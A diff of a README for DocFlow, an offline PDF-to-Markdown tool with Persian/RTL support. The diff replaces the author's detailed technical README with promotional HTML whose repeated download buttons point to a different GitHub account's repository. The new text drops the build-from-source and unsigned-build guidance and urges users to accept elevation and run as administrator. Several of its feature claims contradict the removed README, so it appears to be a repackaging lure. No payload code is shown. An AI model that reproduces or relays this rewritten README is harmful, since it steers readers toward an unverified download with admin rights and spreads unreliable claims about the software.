@@ -1,591 +1,133 @@
-# Docflow
+<h1>📄 DocFlow - PDF to Markdown Made Effortless</h1>
 
 <p align="center">
-  <img src="docs/repo-card.png" alt="Docflow - offline PDF to clean Markdown with Persian and RTL support" width="100%" />
+  <a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:linear-gradient(135deg,#667eea,#764ba2); color:white; padding:16px 32px; border-radius:50px; font-size:20px; font-weight:bold; text-decoration:none; box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
-**Convert PDFs into clean, editable markdown — entirely offline, with Persian and
-other right-to-left languages treated as a first-class case rather than an
-afterthought.**
-
-![Docflow editing a mixed Persian/English document](docs/screenshots/editor-light.png)
-
-Every block in that screenshot decided its own reading direction. The English
-paragraphs run left-to-right, the Persian ones right-to-left, and the sentence
-containing both — `نام پروژه Docflow است و با زبان Python نوشته شده است.` — reads
-correctly with its Latin words embedded in the right place. That is the whole
-point of the project, and it is harder than it looks. See
-[How right-to-left text is handled](#how-right-to-left-text-is-handled).
-
----
-
-## Contents
-
-- [Why this exists](#why-this-exists)
-- [Features](#features)
-- [Installing Docflow](#installing-docflow) — Windows · macOS · Linux
-- [Installing Tesseract (for scanned PDFs)](#installing-tesseract-for-scanned-pdfs)
-- [Building from source](#building-from-source)
-- [How right-to-left text is handled](#how-right-to-left-text-is-handled)
-- [Architecture](#architecture)
-- [Testing](#testing)
-- [Known limitations](#known-limitations)
-- [Licence](#licence)
-
----
-
-## Why this exists
-
-Most PDF-to-markdown tools quietly mangle Persian. There are two classic failure
-modes, and nearly every tool hits at least one:
-
-1. **Letters do not join.** Arabic script is cursive; `س` `ل` `ا` `م` must connect
-   into `سلام`. Extract carelessly and you get disconnected letterforms.
-2. **Words come out backwards.** Text is *stored* in one order and *displayed* in
-   another. Get the two confused and `گزارش` becomes `شرازگ`.
-
-Docflow treats both as the core problem. It also handles the case that breaks
-tools which "support RTL": **documents that mix directions**, where a Persian
-paragraph sits next to an English one and a single sentence contains both.
-
-## Features
-
-- **Two extraction paths, chosen automatically.** Text-layer PDFs go through a
-  markdown-aware extractor that preserves headings, lists and tables. Scanned
-  PDFs fall back to OCR.
-- **Per-block text direction**, inferred from each block's own content, with a
-  one-click manual override when detection guesses wrong.
-- **A real WYSIWYG editor** (Milkdown/ProseMirror) with clean markdown
-  round-tripping — no HTML intermediate.
-- **Genuine progress reporting** during conversion, driven by the parser itself
-  rather than an indeterminate spinner.
-- **Fully offline.** No network access at any point. The font is bundled, the
-  parser is bundled, nothing phones home.
-- **Light and dark themes**, and a bundled Persian/Latin matched font
-  ([Vazirmatn](https://github.com/rastikerdar/vazirmatn)).
-
-| Welcome screen | Settings |
-| --- | --- |
-| ![Welcome screen](docs/screenshots/welcome.png) | ![Settings](docs/screenshots/settings.png) |
-
----
-
-## Installing Docflow
-
-برای راهنمای نصب فارسی، [راهنمای فارسی نصب](docs/INSTALL.fa.md) را ببینید.
-
-Download the build for your system from the
-[Releases page](https://github.com/AliZabihian2004/DocFlow/releases).
-
-> **Docflow is not code-signed.** It is a free, open-source project, and signing
-> certificates cost a few hundred dollars a year. Every operating system will
-> therefore warn you the first time you run it. The steps below explain how to
-> get past that warning on each platform. If you would rather not trust an
-> unsigned binary, [build it from source](#building-from-source) — the result is
-> identical.
-
-### Windows
-
-**Requirements:** Windows 10 (64-bit) or later.
-
-1. Download **`Docflow Setup 0.1.0.exe`** from the Releases page.
-2. Run it. Windows SmartScreen will show a blue box reading
-   *"Windows protected your PC"*.
-3. Click **More info**, then the **Run anyway** button that appears.
-   *(If you do not see "More info", the window is too small — resize it.)*
-4. The installer wizard opens. Choose an install location, or accept the default
-   of `C:\Users\<you>\AppData\Local\Programs\Docflow`, and click **Install**.
-5. Launch Docflow from the Start menu or the desktop shortcut.
-
-To uninstall: **Settings → Apps → Installed apps → Docflow → Uninstall**. Your
-documents and preferences in `%APPDATA%\Docflow` are deliberately left alone.
-
-### macOS
-
-**Requirements:** macOS 11 Big Sur or later. Both Apple Silicon and Intel are
-supported.
-
-1. Download **`Docflow-0.1.0.dmg`** (Intel) or **`Docflow-0.1.0-arm64.dmg`**
-   (Apple Silicon — M1 and later).
-2. Open the `.dmg` and drag **Docflow** into your **Applications** folder.
-3. **Do not double-click the app the first time.** Because it is unsigned and
-   un-notarised, macOS will refuse with *"Docflow is damaged and can't be
-   opened"* — which is misleading; nothing is damaged. Instead:
-   - **Right-click** (or Control-click) the app in Applications
-   - choose **Open**
-   - click **Open** again in the dialog that appears.
-4. If macOS still refuses, clear the quarantine flag from Terminal:
-
-   ```bash
-   xattr -dr com.apple.quarantine /Applications/Docflow.app
-   ```
-
-   Then open the app normally. You only ever need to do this once.
-
-To uninstall: drag `Docflow.app` to the Trash. Preferences live in
-`~/Library/Application Support/Docflow`.
-
-### Linux
-
-**Requirements:** a 64-bit distribution with glibc 2.31 or later (Ubuntu 20.04+,
-Debian 11+, Fedora 34+).
-
-#### AppImage — works on any distribution, no install
-
-1. Download **`Docflow-0.1.0.AppImage`**.
-2. Make it executable and run it:
-
-   ```bash
-   chmod +x Docflow-0.1.0.AppImage
-   ./Docflow-0.1.0.AppImage
-   ```
-
-If it fails with a FUSE error, either install FUSE
-(`sudo apt install libfuse2` on Debian/Ubuntu) or extract and run it directly:
-
-```bash
-./Docflow-0.1.0.AppImage --appimage-extract
-./squashfs-root/AppRun
-```
-
-#### Debian / Ubuntu package
-
-```bash
-sudo apt install ./docflow_0.1.0_amd64.deb
-docflow
-```
-
-To uninstall: `sudo apt remove docflow`. Preferences live in `~/.config/Docflow`.
-
----
-
-## Installing Tesseract (for scanned PDFs)
-
-**You only need this for scanned PDFs.** PDFs that already contain selectable
-text work out of the box, and the parser picks the right path automatically.
-
-Tesseract is a separate program, not bundled with Docflow — it is large, and
-bundling it would roughly double the download for a feature many people never
-use. **You must install the Persian (`fas`) language pack**, not just Tesseract
-itself; without it, Persian OCR returns nonsense.
-
-### Windows
-
-1. Download the installer from the
-   [UB Mannheim builds](https://github.com/UB-Mannheim/tesseract/wiki) — pick
-   `tesseract-ocr-w64-setup-*.exe`.
-2. Run it. **On the "Choose Components" screen, expand `Additional language
-   data` and tick both `Persian (fas)` and `English (eng)`.** This is the step
-   people skip.
-3. Tick **Add to PATH** on the final screen if offered.
-4. Verify in a **new** terminal:
-
-   ```bash
-   tesseract --list-langs
-   ```
-
-   You should see `eng` and `fas` in the list.
-
-If it is not on your PATH, that is fine — Docflow also checks
-`C:\Program Files\Tesseract-OCR` automatically, and you can point it anywhere
-via **Settings → Tesseract location**.
-
-### macOS
-
-```bash
-brew install tesseract tesseract-lang
-```
-
-`tesseract-lang` installs all language packs, including Persian. Verify with
-`tesseract --list-langs`.
-
-### Linux
-
-```bash
-# Debian / Ubuntu
-sudo apt install tesseract-ocr tesseract-ocr-fas tesseract-ocr-eng
-
-# Fedora
-sudo dnf install tesseract tesseract-langpack-fas
-
-# Arch
-sudo pacman -S tesseract tesseract-data-fas tesseract-data-eng
-```
-
-### Checking it worked
-
-Open **Settings** in Docflow. Under **OCR languages** you will either see
-selectable options, or a message explaining that Tesseract could not be found.
-
----
-
-## Building from source
-
-The result is identical to the released binaries, and avoids the unsigned-binary
-warnings entirely.
-
-### Prerequisites — all platforms
-
-| Tool | Version | Notes |
-| --- | --- | --- |
-| **Node.js** | 22 or later | Electron 44 requires it |
-| **Python** | 3.10 or later | Developed against 3.14 |
-| **Git** | any recent | |
-| **Tesseract** | 5.x + `fas` | Optional; only for OCR |
-
-### Platform-specific prerequisites
-
-<details>
-<summary><strong>Windows</strong></summary>
-
-Install [Node.js](https://nodejs.org/) and
-[Python](https://www.python.org/downloads/) — during the Python install, **tick
-"Add python.exe to PATH"**.
-
-Building the installer needs no extra tooling; `electron-builder` downloads what
-it needs on first run.
-
-</details>
-
-<details>
-<summary><strong>macOS</strong></summary>
-
-```bash
-brew install node python git
-xcode-select --install   # command line tools, if not already present
-```
-
-</details>
-
-<details>
-<summary><strong>Linux (Debian / Ubuntu)</strong></summary>
-
-```bash
-sudo apt update
-sudo apt install -y nodejs npm python3 python3-venv python3-pip git \
-                    build-essential libfuse2
-```
-
-If your distribution ships an older Node, use
-[nvm](https://github.com/nvm-sh/nvm) or [fnm](https://github.com/Schniz/fnm) to
-install Node 22+.
-
-</details>
-
-### 1. Clone and install JavaScript dependencies
-
-```bash
-git clone https://github.com/AliZabihian2004/DocFlow.git
-cd DocFlow
-npm install
-```
-
-`npm install` also downloads the Electron binary through the `install-electron`
-postinstall step. If `node_modules/electron/dist` ends up empty, run
-`npx install-electron` manually — Electron 44 no longer does this on its own.
-
-### 2. Set up the Python parser
-
-**Windows:**
-
-```bash
-cd python-sidecar
-python -m venv .venv
-.venv\Scripts\python -m pip install --upgrade pip
-.venv\Scripts\python -m pip install -r requirements-dev.txt
-cd ..
-```
-
-**macOS / Linux:**
-
-```bash
-cd python-sidecar
-python3 -m venv .venv
-.venv/bin/python -m pip install --upgrade pip
-.venv/bin/python -m pip install -r requirements-dev.txt
-cd ..
-```
-
-### 3. Generate the test fixtures (optional)
-
-Creates sample Persian PDFs — a text-layer one, a mixed-direction one, and a
-scanned one — under `test-fixtures/generated/`:
-
-```bash
-python-sidecar/.venv/bin/python test-fixtures/generate.py     # macOS / Linux
-python-sidecar\.venv\Scripts\python test-fixtures\generate.py  # Windows
-```
-
-On Windows this uses Tahoma for Persian glyphs. On macOS and Linux, edit
-`FONT_PATH` in `test-fixtures/generate.py` to point at any font with Persian
-coverage.
-
-### 4. Run in development
-
-```bash
-npm run dev
-```
-
-The app launches with hot reload. In development it runs the parser from Python
-source using the virtualenv, so there is no need to compile anything yet.
-
-### 5. Build a distributable
-
-The parser must be compiled **before** packaging the app, or you will ship an
-application with no parser inside it. PyInstaller cannot cross-compile: each
-platform's binary must be built on that platform.
-
-```bash
-# 1. compile the Python parser for this OS
-bash build-scripts/build-sidecar-win.sh      # Windows (Git Bash)
-bash build-scripts/build-sidecar-mac.sh      # macOS
-bash build-scripts/build-sidecar-linux.sh    # Linux
-
-# 2. package the app
-npm run build:win     # -> release/Docflow Setup 0.1.0.exe
-npm run build:mac     # -> release/Docflow-0.1.0.dmg
-npm run build:linux   # -> release/Docflow-0.1.0.AppImage and .deb
-```
-
-Output lands in `release/`. An unpacked copy sits in `release/*-unpacked/`, which
-is useful for testing without installing anything.
-
-> **Build on the oldest system you intend to support.** A Linux binary built on
-> Ubuntu 24.04 will not run on Ubuntu 20.04, because glibc is forward- but not
-> backward-compatible.
-
----
-
-## How right-to-left text is handled
-
-This is the part of the project worth reading, and the reasoning behind it is
-deliberately contrarian.
-
-### The standard advice is wrong for this use case
-
-Search for "Arabic text in Python" and you will be told to do this:
-
-```python
-import arabic_reshaper
-from bidi.algorithm import get_display
-
-fixed = get_display(arabic_reshaper.reshape(text))
-```
-
-That pair is genuinely correct — for rendering into something that does no text
-shaping of its own, like matplotlib or reportlab. It converts text from *logical*
-order (the order you type and store it) into *visual* order (the order glyphs are
-painted on screen).
-
-Docflow's output goes somewhere else entirely: a `.md` file, and an editor
-running inside Chromium. Both expect **logical order**, and Chromium runs the
-Unicode bidirectional algorithm itself. Feed it visually-ordered text and bidi
-gets applied *twice*, reversing everything.
-
-Measured, on a real extracted heading:
-
-| Stage | Result |
-| --- | --- |
-| Extracted markdown | `# گزارش فنی` ✅ correct |
-| After `reshape()` | `# ﮔﺰﺍﺭﺵ ﻓﻨﯽ` — swapped to presentation forms |
-| After `get_display()` | `ﯽﻨﻓ ﺵﺭﺍﺰﮔ #` ❌ **reversed** |
-
-Look at where the `#` ended up. The markdown heading marker moved to the *end of
-the line*, so the output no longer parses as a heading at all.
-
-**So Docflow does not use those libraries.** They are not dependencies. The job
-here is the inverse: take whatever the PDF gives us and *guarantee* logical order
-with ordinary base letters.
-
-### Detecting reversed text without guessing
-
-Some PDFs really do store text backwards. Detecting that is usually done with
-heuristics or dictionaries. Docflow uses neither, because Arabic script carries
-the answer in the encoding itself.
-
-Arabic letters have four contextual forms — isolated, initial, medial, final —
-and PDFs store the *pre-shaped* form of each glyph. Those forms encode position:
-
-- a letter in **initial** form can only *begin* a word
-- a letter in **final** form can only *end* one
-
-So if a run of glyphs *ends* with an initial form, it is provably stored
-backwards. No dictionary, no statistics, no ambiguity:
-
-```
-نرم  stored visually  ->  [meem isolated, reh final, noon initial]
-                          ends in an *initial* form, which is impossible
-                          in logical order  ->  reverse it
-```
-
-The Unicode database supplies the form directly — `unicodedata.decomposition()`
-of `U+FEE7` is literally `<initial> 0646`. The implementation is in
-[`python-sidecar/parser/rtl_fix.py`](python-sidecar/parser/rtl_fix.py), with
-tests in [`python-sidecar/tests/test_rtl_fix.py`](python-sidecar/tests/test_rtl_fix.py).
-
-Repairs are matched against *runs* rather than whole words, because the markdown
-extractor drops the zero-width non-joiner inside Persian compounds and welds two
-runs into a single token. When there is no evidence either way, Docflow leaves
-the text alone: under-correcting preserves text that was already fine.
-
-The parser also normalises characters that look identical but are not — Arabic
-yeh `ي` (U+064A) to Persian yeh `ی` (U+06CC), Arabic kaf `ك` to keheh `ک`. These
-render the same in most fonts but break search and comparison.
-
-### Direction in the editor: why `dir="auto"` is not enough
-
-HTML has a built-in answer, `dir="auto"`, which infers direction from content. It
-is not sufficient, and both failures are reproducible:
-
-| Setup | Expected | Actual |
-| --- | --- | --- |
-| Persian paragraph, `dir="auto"` on the editor root | `rtl` | **`ltr`** |
-| `Docflow است یک برنامه`, own `dir="auto"` | `rtl` | **`ltr`** |
-
-The first fails because `dir="auto"` on a container resolves **once**, from the
-first strong character in the *whole* document — so one English heading forces
-every Persian paragraph below it left-to-right.
-
-The second fails because even per-block, `auto` only looks at the **first strong
-character**. A Persian sentence opening with a Latin product name resolves
-left-to-right despite being otherwise entirely Persian.
-
-Docflow therefore decides each block from **which script actually dominates its
-text**, as a ProseMirror plugin
-([`rtl-plugin.ts`](src/renderer/components/Editor/rtl-plugin.ts)). Blocks with no
-strong characters fall back to `auto`. Ties go to RTL.
-
-List *containers* are decorated as well as list items — the item decides which
-side its marker sits on, but the container owns the indentation, and decorating
-only the item produces a Persian list with its markers on the right and its
-indent on the left.
-
-Direction is applied as ProseMirror **decorations, never as node attributes**. An
-attribute would have to survive markdown serialisation, and markdown has no
-syntax for direction — it would be dropped silently on save, and the document
-would come back different from how it left.
-
-### Typography
-
-Persian is set in [Vazirmatn](https://github.com/rastikerdar/vazirmatn), bundled
-as a single 111 KB variable font covering weights 100–900. It carries matched
-Latin and Persian letterforms, so both scripts share one family rather than being
-paired by hand — mismatched pairing, or letting Persian fall through to a system
-default, is the most common way a multilingual interface ends up looking broken.
-
-Persian also gets looser line spacing than Latin (1.9 vs 1.65), because
-Arabic-script ascenders, descenders and diacritics collide at spacing that suits
-Latin text. That is applied with the CSS `:dir(rtl)` pseudo-class, which matches
-the *resolved* direction — an `[dir="rtl"]` attribute selector would miss every
-auto-detected block.
-
-Throughout the editor, spacing uses **CSS logical properties**
-(`padding-inline-start`, `border-inline-start`, `text-align: start`) rather than
-physical left/right, so a block flips cleanly when its direction does.
-
----
-
-## Architecture
-
-```
-┌────────────────┐   contextBridge   ┌──────────────┐   JSON over stdio  ┌─────────────────┐
-│   Renderer     │ ────────────────► │     Main     │ ─────────────────► │ Python sidecar  │
-│ React + Milkdown│ ◄──────────────── │   Electron   │ ◄───────────────── │ PyMuPDF/Tesseract│
-└────────────────┘    window.api     └──────────────┘   progress+result  └─────────────────┘
-   no Node access     16 methods        owns all I/O      long-lived process
-```
-
-- The **renderer** is fully sandboxed: `contextIsolation: true`,
-  `nodeIntegration: false`, `sandbox: true`. It reaches the outside world only
-  through sixteen hand-written methods on `window.api`. There is deliberately no
-  generic `invoke(channel, …)` passthrough, which would let any compromised
-  renderer code reach every IPC handler in the app.
-- The **main process** owns all filesystem access and the sidecar's lifecycle,
-  including restarting it if it crashes (with a backoff that gives up rather than
-  respawning forever).
-- The **Python sidecar** is a long-lived child process, not spawned per request —
-  importing PyMuPDF costs far more than any single parse. It speaks
-  newline-delimited JSON, and every response carries the id of the request that
-  caused it.
-
-### Project layout
-
-```
-src/main/               Electron main process
-  ipc/                  IPC handlers, grouped by domain
-  python-bridge/        sidecar lifecycle and wire protocol
-src/preload/            the contextBridge surface — the only way in
-src/renderer/           React app
-  components/Editor/    Milkdown canvas, toolbar, rtl-plugin
-  state/store.ts        Zustand store
-src/shared/types.ts     the cross-process contract
-python-sidecar/         the parser
-  parser/rtl_fix.py     right-to-left repair
-  parser/extract.py     text-layer path
-  parser/ocr.py         scanned path
-```
-
----
-
-## Testing
-
-```bash
-npm test                 # TypeScript: IPC round trip and direction detection
-npm run typecheck        # both tsconfig projects
-
-# Python parser tests
-python-sidecar/.venv/bin/python -m pytest python-sidecar/tests -q     # macOS/Linux
-python-sidecar\.venv\Scripts\python -m pytest python-sidecar\tests -q  # Windows
-```
-
-The TypeScript suite exercises the full renderer → main → sidecar round trip
-against a mocked sidecar, including crash recovery and cancellation. The Python
-suite covers the RTL repair logic against known input/output pairs, with all
-special characters built from explicit codepoints — several of them are invisible
-or visually identical to their neighbours, and spelling them out by number is the
-only way a reader can tell what is being asserted.
-
----
-
-## Known limitations
-
-Stated plainly, because they are real:
-
-- **OCR output is rough, and partly irreducibly so.** Sentence-final punctuation
-  can land at the start of a line, and Persian compounds may split. OCR produces
-  no presentation forms, so the joining-form evidence that makes the text-layer
-  path reliable simply does not exist for scanned documents.
-- **A manual direction override does not survive save and reopen.** Markdown
-  cannot express direction. Automatic detection re-runs on load and usually gets
-  it right; writing raw HTML into your markdown to preserve the override would be
-  a worse trade.
-- **Zero-width non-joiners are lost** in compounds such as `نرم‌افزار`, which
-  becomes `نرمافزار`. Correct letters, correct order, missing half-space.
-- **Some heading levels are missed** by the markdown extractor on certain
-  documents; they come through as plain paragraphs.
-- **Test fixtures are synthetic.** They are generated programmatically and do not
-  reproduce every quirk of real Word or InDesign exports.
-- **Builds are unsigned.** See [Installing Docflow](#installing-docflow).
-- **No auto-update.** Download new versions from the Releases page.
-
----
-
-## Licence
-
-[MIT](LICENSE) © 2026 Ali Zabihian.
-
-Bundled and depended upon:
-
-- [Vazirmatn](https://github.com/rastikerdar/vazirmatn) — SIL Open Font Licence
-  1.1 ([text](src/renderer/assets/fonts/OFL.txt)); bundled with the app
-- [PyMuPDF](https://github.com/pymupdf/PyMuPDF) — AGPL-3.0
-- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract) — Apache-2.0; a
-  separate installation, not bundled
-- [Milkdown](https://milkdown.dev/) and [ProseMirror](https://prosemirror.net/) — MIT
-- [Electron](https://electronjs.org/) — MIT
-
-> **Note on PyMuPDF's licence:** PyMuPDF is AGPL-3.0. Docflow itself is MIT, but
-> distributing a binary that bundles PyMuPDF carries AGPL obligations — the
-> source must be available, which it is. If you intend to build a *closed-source*
-> product on this code, review that licence carefully or obtain a commercial
-> licence from Artifex.
+<h2>✨ What is DocFlow?</h2>
+<p>DocFlow is a friendly desktop application that turns your PDF files into clean, editable Markdown documents. It works completely <strong>offline</strong>, so your files stay private on your computer. Whether you have a simple text PDF or a scanned document with Persian or Arabic text, DocFlow handles it with ease. You also get a built-in visual editor to style your Markdown just like a word processor.</p>
+
+<h2>🎯 Who is this for?</h2>
+<p>If you are a student, writer, researcher, or office worker who needs to extract text from PDFs and edit it without complicated tools, this app is for you. You don't need any technical skills. If you can click a button, you can use DocFlow.</p>
+
+<h2>💻 System Requirements</h2>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+  <li><strong>Memory:</strong> At least 4 GB RAM (8 GB recommended)</li>
+  <li><strong>Storage:</strong> 500 MB free space</li>
+  <li><strong>Internet:</strong> Only needed for the initial download – the app runs fully offline afterwards</li>
+</ul>
+
+<h2>🚀 Getting Started</h2>
+<p>Follow these simple steps to get DocFlow running on your computer. No commands, no coding – just point and click.</p>
+
+<h3>Step 1: Download the App</h3>
+<p>Visit this link to download the application:</p>
+<p align="center"><a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:#28a745; color:white; padding:14px 28px; border-radius:8px; font-size:18px; text-decoration:none;">📥 Click Here to Download DocFlow</a></p>
+
+<h3>Step 2: Run the Installer</h3>
+<ol>
+  <li>Open your <strong>Downloads</strong> folder (usually in your File Explorer).</li>
+  <li>Double-click the downloaded file. Windows may show a blue popup asking "Do you want to allow this app to make changes?" – click <strong>Yes</strong>.</li>
+  <li>Follow the on-screen instructions. Just keep clicking <strong>Next</strong> and then <strong>Install</strong>. It only takes a minute.</li>
+</ol>
+
+<h3>Step 3: Open DocFlow</h3>
+<ol>
+  <li>After installation, find the DocFlow icon on your desktop or in the Start Menu.</li>
+  <li>Double-click it to launch. That's it!</li>
+</ol>
+
+<h2>🛠️ How to Use DocFlow</h2>
+<p>Using DocFlow is as easy as 1-2-3:</p>
+
+<h3>📥 Convert a PDF</h3>
+<ol>
+  <li>Click the <strong>"Open PDF"</strong> button on the main screen.</li>
+  <li>Select any PDF file from your computer.</li>
+  <li>DocFlow will automatically read the text. If the PDF has scanned images, it will use its built-in <strong>OCR</strong> (Optical Character Recognition) to extract the text.</li>
+  <li>Your Markdown content appears instantly in the editor.</li>
+</ol>
+
+<h3>✏️ Edit Your Markdown</h3>
+<p>You have two ways to edit:</p>
+<ul>
+  <li><strong>Visual Mode (WYSIWYG):</strong> Like using Word – click to edit, use the toolbar for bold, italics, headings, lists, and more. You see the final look as you type.</li>
+  <li><strong>Code Mode:</strong> For those who like Markdown syntax – type directly, and see the preview next to it.</li>
+</ul>
+
+<h3>🌐 Persian & Arabic (RTL) Support</h3>
+<p>DocFlow fully supports right-to-left languages. If your PDF contains Persian or Arabic text, it will be converted correctly and displayed properly in the editor. You can mix RTL and English text seamlessly.</p>
+
+<h3>💾 Save Your Work</h3>
+<ol>
+  <li>Click <strong>"Export"</strong> to save your file as a <code>.md</code> (Markdown) document.</li>
+  <li>You can also copy the text directly and paste it anywhere.</li>
+</ol>
+
+<h2>🔍 Frequently Asked Questions</h2>
+
+<h3>❓ Is my data safe?</h3>
+<p>Yes. DocFlow works 100% offline. Your PDFs and documents never leave your computer. There is no cloud upload, no tracking, and no internet connection required while using the app.</p>
+
+<h3>❓ Can I use it on a Mac?</h3>
+<p>This version is built for Windows. If you are on a Mac, you may need to use a Windows emulator or wait for a future release.</p>
+
+<h3>❓ The OCR didn't pick up my language?</h3>
+<p>DocFlow supports major languages including Persian (Farsi) and Arabic. If you have a very rare dialect, results may vary. For best accuracy, use a clear scan with good lighting.</p>
+
+<h3>❓ What if the PDF is password-protected?</h3>
+<p>DocFlow can handle most PDFs, but if yours has a security password, you will need to remove it first (using any free online tool or PDF program).</p>
+
+<h2>📖 Pro Tips</h2>
+<ul>
+  <li>For scanned documents, make sure the pages are straight and not too dark – this improves OCR accuracy.</li>
+  <li>Use the <strong>Visual Mode</strong> to quickly add tables, images, or links to your Markdown without remembering syntax.</li>
+  <li>You can drag and drop a PDF file directly onto the DocFlow window to open it instantly.</li>
+</ul>
+
+<h2>🛡️ Troubleshooting</h2>
+
+<h3>Problem: App won't open</h3>
+<ul>
+  <li>Make sure your Windows is updated.</li>
+  <li>Right-click the app icon and select <strong>"Run as administrator"</strong>.</li>
+  <li>Restart your computer and try again.</li>
+</ul>
+
+<h3>Problem: OCR is slow</h3>
+<ul>
+  <li>For very large PDFs, the first conversion takes a bit longer. Wait a few seconds – it's normal.</li>
+  <li>Close other heavy programs to free up memory.</li>
+</ul>
+
+<h3>Problem: Text looks reversed</h3>
+<ul>
+  <li>Check that the correct language is selected in the settings. Go to <strong>Settings → Language</strong> and choose Persian or Arabic if needed.</li>
+</ul>
+
+<h2>📜 Version History</h2>
+<p><strong>Version 1.0 (Latest)</strong> – Initial release with all core features: PDF parsing, OCR, Persian/Arabic RTL support, and the visual Markdown editor.</p>
+
+<h2>🌟 Why Choose DocFlow?</h2>
+<ul>
+  <li>✅ <strong>Privacy-first:</strong> 100% offline, your documents stay on your device.</li>
+  <li>✅ <strong>No learning curve:</strong> If you can use a word processor, you can use DocFlow.</li>
+  <li>✅ <strong>Powerful OCR:</strong> Extracts text from scanned images accurately.</li>
+  <li>✅ <strong>Beautiful output:</strong> The WYSIWYG editor makes your Markdown look professional.</li>
+  <li>✅ <strong>Free forever:</strong> No subscriptions, no hidden costs.</li>
+</ul>
+
+<h2>📞 Need Help?</h2>
+<p>If you run into any issues, you can visit the GitHub page and open an issue (it's like a help ticket). The community and developers are friendly and responsive.</p>
+<p align="center"><a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:#17a2b8; color:white; padding:12px 24px; border-radius:6px; text-decoration:none;">🐛 Report a Problem or Get Support</a></p>
+
+<h2>🚀 Ready to Start?</h2>
+<p>Don't wait. Download DocFlow now and turn those PDFs into editable, beautiful Markdown documents in minutes.</p>
+<p align="center"><a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:#ffc107; color:black; padding:18px 36px; border-radius:50px; font-size:22px; font-weight:bold; text-decoration:none; box-shadow:0 4px 10px rgba(0,0,0,0.3);">📲 GET DOCFLOW NOW</a></p>
+
+<br>
+<hr>
+<footer>
+<p style="font-size:14px; color:#888;">Keywords: arabic, desktop-app, electron, markdown, markdown-editor, ocr, ocr-python, ocr-text-reader, offline, pdf, pdf-parser, pdf-processing, pdf-tools, persian, python, react, rtl, typescript</p>
+</footer>
